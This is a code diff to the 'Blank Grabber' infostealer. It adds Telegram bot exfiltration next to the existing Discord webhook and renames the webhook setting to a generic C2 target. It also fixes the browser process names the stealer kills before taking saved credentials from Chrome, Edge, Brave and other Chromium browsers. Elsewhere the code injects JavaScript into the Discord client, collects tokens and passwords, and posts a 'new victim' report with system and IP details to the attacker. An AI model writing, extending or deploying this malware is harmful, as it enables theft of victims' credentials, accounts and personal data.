@@ -19,12 +19,11 @@ import ctypes
 import logging
 
 from threading import Thread
-from functools import reduce
 from urllib3 import PoolManager, HTTPResponse
 
 class Settings:
 
-    Webhook = "%webhook%"
+    C2 = "%c2%"
     PingMe = bool("%pingme%")
     Vmprotect = bool("%vmprotect%")
     Startup = bool("%startup%")
@@ -817,7 +816,7 @@ class Discord:
     def InjectJs() -> str | None: # Injects javascript into the Discord client's file
         check = False
         try:
-            code = base64.b64decode(b"%injectionbase64encoded%").decode().replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.Webhook.encode()).decode()))
+            code = base64.b64decode(b"%injectionbase64encoded%").decode().replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.C2[1].encode()).decode()))
         except Exception:
             return None
         
@@ -1204,26 +1203,27 @@ class BlankGrabber:
 
         threads: list[Thread] = []
         paths = {
-            "Brave" : os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"),
-            "Chrome" : os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data"),
-            "Chromium" : os.path.join(os.getenv("localappdata"), "Chromium", "User Data"),
-            "Comodo" : os.path.join(os.getenv("localappdata"), "Comodo", "Dragon", "User Data"),
-            "Edge" : os.path.join(os.getenv("localappdata"), "Microsoft", "Edge", "User Data"),
-            "EpicPrivacy" : os.path.join(os.getenv("localappdata"), "Epic Privacy Browser", "User Data"),
-            "Iridium" : os.path.join(os.getenv("localappdata"), "Iridium", "User Data"),
-            "Opera" : os.path.join(os.getenv("appdata"), "Opera Software", "Opera Stable"),
-            "Opera GX" : os.path.join(os.getenv("appdata"), "Opera Software", "Opera GX Stable"),
-            "Slimjet" : os.path.join(os.getenv("localappdata"), "Slimjet", "User Data"),
-            "UR" : os.path.join(os.getenv("localappdata"), "UR Browser", "User Data"),
-            "Vivaldi" : os.path.join(os.getenv("localappdata"), "Vivaldi", "User Data"),
-            "Yandex" : os.path.join(os.getenv("localappdata"), "Yandex", "YandexBrowser", "User Data")
+            "Brave" : (os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"), "brave"),
+            "Chrome" : (os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data"), "chrome"),
+            "Chromium" : (os.path.join(os.getenv("localappdata"), "Chromium", "User Data"), "chromium"),
+            "Comodo" : (os.path.join(os.getenv("localappdata"), "Comodo", "Dragon", "User Data"), "comodo"),
+            "Edge" : (os.path.join(os.getenv("localappdata"), "Microsoft", "Edge", "User Data"), "msedge"),
+            "EpicPrivacy" : (os.path.join(os.getenv("localappdata"), "Epic Privacy Browser", "User Data"), "epic"),
+            "Iridium" : (os.path.join(os.getenv("localappdata"), "Iridium", "User Data"), "iridium"),
+            "Opera" : (os.path.join(os.getenv("appdata"), "Opera Software", "Opera Stable"), "opera"),
+            "Opera GX" : (os.path.join(os.getenv("appdata"), "Opera Software", "Opera GX Stable"), "operagx"),
+            "Slimjet" : (os.path.join(os.getenv("localappdata"), "Slimjet", "User Data"), "slimjet"),
+            "UR" : (os.path.join(os.getenv("localappdata"), "UR Browser", "User Data"), "urbrowser"),
+            "Vivaldi" : (os.path.join(os.getenv("localappdata"), "Vivaldi", "User Data"), "vivaldi"),
+            "Yandex" : (os.path.join(os.getenv("localappdata"), "Yandex", "YandexBrowser", "User Data"), "yandex")
         }
 
-        for name, path in paths.items():
+        for name, item in paths.items():
+            path, procname = item
             if os.path.isdir(path):
                 def run(name, path):
                     try:
-                        Utility.TaskKill(name)
+                        Utility.TaskKill(procname)
                         browser = Browsers.Chromium(path)
                         saveToDir = os.path.join(self.TempFolder, "Credentials", name)
 
@@ -1437,8 +1437,9 @@ class BlankGrabber:
 
     def SendData(self) -> None: # Sends data to the webhook
         extention = self.CreateArchive()
+
         if os.path.isfile(self.ArchivePath):
-            Logger.info("Sending data to webhook")
+            Logger.info("Sending data to C2")
             computerName = os.getenv("computername")
             computerOS = subprocess.run('wmic os get Caption', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().splitlines()[2].strip()
             totalMemory = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip().split()[1])/1000000000)) + " GB"
@@ -1461,6 +1462,8 @@ class BlankGrabber:
             else:
                 ipinfo = data
 
+            system_info = f"Computer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}"
+
             collection = {
                             "Discord Accounts" : len(self.DiscordTokens),
                             "Passwords" : len(self.Passwords),
@@ -1482,12 +1485,12 @@ class BlankGrabber:
 
             image_url = "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png"
 
-            payload = {
+            payload_discord = {
   "content": "||@everyone||" if Settings.PingMe else "",
   "embeds": [
     {
       "title": "Blank Grabber",
-      "description": f"**__System Info__\n```autohotkey\nComputer Name: {computerName}\nComputer OS: {computerOS}\nTotal Memory: {totalMemory}\nUUID: {uuid}\nCPU: {cpu}\nGPU: {gpu}\nProduct Key: {productKey}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
+      "description": f"**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**",
       "url": "https://github.com/Blank-c/Blank-Grabber",
       "color": 34303,
       "footer": {
@@ -1502,6 +1505,11 @@ class BlankGrabber:
   "avatar_url" : image_url
 }
 
+            payload_telegram = {
+                'caption': f'<b>Blank Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
+                'parse_mode': 'HTML'
+            }
+
             filename = "Blank-{}.{}".format(os.getlogin(), extention)
 
             if os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20: # Max upload size is 25 MB
@@ -1512,16 +1520,27 @@ class BlankGrabber:
             fields = dict()
 
             if not url:
-                with open(self.ArchivePath, "rb") as file:
+                with open(self.ArchivePath, 'rb') as file:
                     fileBytes = file.read()
-
-                fields["file"] = (filename, fileBytes)
+                if Settings.C2[0] == 0:
+                    fields['file'] = (filename, fileBytes)
+                elif Settings.C2[0] == 1:
+                    fields['document'] = (filename, fileBytes)
             else:
-                payload["content"] += " | Archive : {}".format(url)
-            
-            fields["payload_json"] = json.dumps(payload).encode()
+                if Settings.C2[0] == 0:
+                    payload_discord['content'] += ' | Archive : {}'.format(url)
+                elif Settings.C2[0] == 1:
+                    payload_telegram['caption'] += '\n\nArchive : {}'.format(url)
 
-            http.request("POST", Settings.Webhook, fields= fields)
+        
+            if Settings.C2[0] == 0:
+                fields['payload_json'] = json.dumps(payload_discord).encode()
+                http.request('POST', Settings.C2[1], fields=fields)
+            elif Settings.C2[0] == 1:
+                token, chat_id = Settings.C2[1].split('$')
+                fields.update(payload_telegram)
+                fields.update({'chat_id': chat_id})
+                http.request('POST', 'https://api.telegram.org/bot%s/sendDocument' % token, fields=fields)
         else:
             raise FileNotFoundError("Archive not found")
 
